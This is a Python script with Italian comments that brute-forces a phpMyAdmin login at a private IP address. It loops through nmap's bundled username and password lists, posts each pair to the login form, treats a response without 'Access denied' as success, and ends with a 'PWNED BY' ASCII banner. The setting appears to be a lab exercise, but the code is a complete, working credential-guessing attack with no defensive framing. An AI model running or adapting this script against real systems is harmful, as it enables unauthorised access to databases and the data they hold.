import sys
import requests

#si aprono i file esterni contenenti usernames e passwords più usati. viene messo cosi e non con tutto il path perchè si trovano nella stessa cartella di questo script

user_file = open('/usr/share/nmap/nselib/data/usernames.lst')
pass_file = open('/usr/share/nmap/nselib/data/passwords.lst')

#viene letta ogni riga dei file, senza spazi e punteggiatura
user_list = user_file.readlines()
pass_list = pass_file.readlines()

#si crea un ciclo con questa variabile, dove in caso di bruteforce avvenuto, viene interrotto
found = 0

#per ogni utente presente nel precedente file, viene provata una password dell'altro file, fino a che non abbiamo il match
for user in user_list:
    user = user.rstrip()
    if(not user.startswith('#')):
        for pwd in pass_list:
            pwd = pwd.rstrip()
            if(not pwd.startswith('#')):
        
            #escamotage grafico per cancellare la riga precedente, che non ha match positivo, che viene sovrascritta dalla successiva.
                
                sys.stdout.write("\033[A")
                sys.stdout.write("\033[K")
                
                #stampa user e pwd sulla stessa riga, separati dal "-"
                print (user, "-", pwd)
                
                #check degli headers contenenti nella richiesta di login
                headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
                
                #parametri da inserire per provare il bruteforce
                post_par ={'pma_username': user, 'pma_password': pwd, 'server':1 }
                
                #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
                risp=requests.post('http://192.168.50.101/phpMyAdmin/index.php',post_par)
                
                #è apparso subito all'occhio che in tutte le prove che non andavano a buon fine, era presente la scritta "Access denied". perciò 	abbiamo cercato l'unico match di user e pwd che non contenesse questa particolare scritta. In quel caso, il bruteforce sarebbe riuscito.
                if(risp.text.find("Access denied") == -1):
                
                #stampa il match user - pwd corretto e trasforma found al valore 1
                    print(f"\nLog in!\n\nuser: {user}\npassword: {pwd}\n\n\n") 
                    found=1
                    break
            
         #con found al valore 1, chiude il ciclo   
    if(found==1):
        break
        
#chiusura file aperti inizialmente
user_file.close()
pass_file.close()

print("PWNED BY")
print("\n /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$   /$$$$$$  /$$$$$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$   /$$$$$$")
print("| $$$ | $$| $$_____/|__  $$__/| $$__  $$ /$$__  $$|_  $$_/| $$__  $$| $$_____/| $$__  $$ /$$__  $$")
print("| $$$$| $$| $$         | $$   | $$  \ $$| $$  \ $$  | $$  | $$  \ $$| $$      | $$  \ $$| $$  \__/")
print("| $$ $$ $$| $$$$$      | $$   | $$$$$$$/| $$$$$$$$  | $$  | $$  | $$| $$$$$   | $$$$$$$/|  $$$$$$ ")
print("| $$  $$$$| $$__/      | $$   | $$__  $$| $$__  $$  | $$  | $$  | $$| $$__/   | $$__  $$ \____  $$")
print("| $$\  $$$| $$         | $$   | $$  \ $$| $$  | $$  | $$  | $$  | $$| $$      | $$  \ $$ /$$  \ $$")
print("| $$ \  $$| $$$$$$$$   | $$   | $$  | $$| $$  | $$ /$$$$$$| $$$$$$$/| $$$$$$$$| $$  | $$|  $$$$$$/")
print("|__/  \__/|________/   |__/   |__/  |__/|__/  |__/|______/|_______/ |________/|__/  |__/ \______/ ")
